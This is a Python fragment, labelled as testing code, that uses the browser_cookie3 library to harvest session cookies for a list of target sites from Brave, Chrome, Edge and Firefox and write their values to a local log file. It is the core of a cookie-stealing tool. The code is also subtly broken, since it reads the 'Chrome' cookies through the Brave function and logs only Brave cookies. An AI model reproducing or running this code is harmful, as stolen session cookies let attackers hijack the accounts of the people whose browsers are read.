######################################
######################################
#### TESTING FILES
#### IGNORE
######################################
######################################


if self.use_site_list:
            valid_cookies = {}
            valid_cookies_brave = {}
            valid_cookies_chrome = {}
            valid_cookies_edge = {}
            valid_cookies_firefox = {}

            for domain in sites:
                cookiename = sites[domain]

                try:
                    brave_cookies = browser_cookie3.brave(domain_name=domain)

                    for cookie in brave_cookies:
                        if cookiename in cookie.name.lower():
                            valid_cookies_brave[domain] = cookie.value
                
                    chrome_cookies = browser_cookie3.brave(domain_name=domain)

                    for cookie in chrome_cookies:
                        # Check if the cookie name is in the current cookie
                        if cookiename in cookie.name.lower():
                            # If true set the cookie name in dictionary to the cookie value
                            valid_cookies_chrome[domain] = cookie.value
                
                    edge_cookies = browser_cookie3.edge(domain_name=domain)

                    for cookie in edge_cookies:
                        # Check if the cookie name is in the current cookie
                        if cookiename in cookie.name.lower():
                            # If true set the cookie name in dictionary to the cookie value
                            valid_cookies_edge[domain] = cookie.value
                
                    firefox_cookies = browser_cookie3.firefox(domain_name=domain)

                    for cookie in firefox_cookies:
                        # Check if the cookie name is in the current cookie
                        if cookiename in cookie.name.lower():
                            # If true set the cookie name in dictionary to the cookie value
                            valid_cookies_firefox[domain] = cookie.value
                except Exception as e:
                    print("Error")
                    print(e)
        
            valid_cookies["brave"] = valid_cookies_brave
            valid_cookies["chrome"] = valid_cookies_chrome
            valid_cookies["edge"] = valid_cookies_edge
            valid_cookies["firefox"] = valid_cookies_firefox
        
        if self.log_cookies:
            with open("logs.txt", "w") as f:
                f.write("#### Brave Cookies: ####\n")
                for cookie_name in valid_cookies_brave:
                    f.write(f"{cookie_name}: {valid_cookies_brave[cookie_name]}\n")
                    
                    f.write("#### Chrome Cookies: ####\n")
                    for cookie_name in valid_cookies_brave:
                        f.write(f"{cookie_name}: {valid_cookies_brave[cookie_name]}\n")
                    
                    f.write("#### Edge Cookies: ####\n")
                    for cookie_name in valid_cookies_brave:
                        f.write(f"{cookie_name}: {valid_cookies_brave[cookie_name]}\n")
                    
                    f.write("#### Firefox Cookies: ####\n")
                    for cookie_name in valid_cookies_brave:
                        f.write(f"{cookie_name}: {valid_cookies_brave[cookie_name]}\n")

def get_sites():
    with open("sites.json") as f:
        return json.load(f)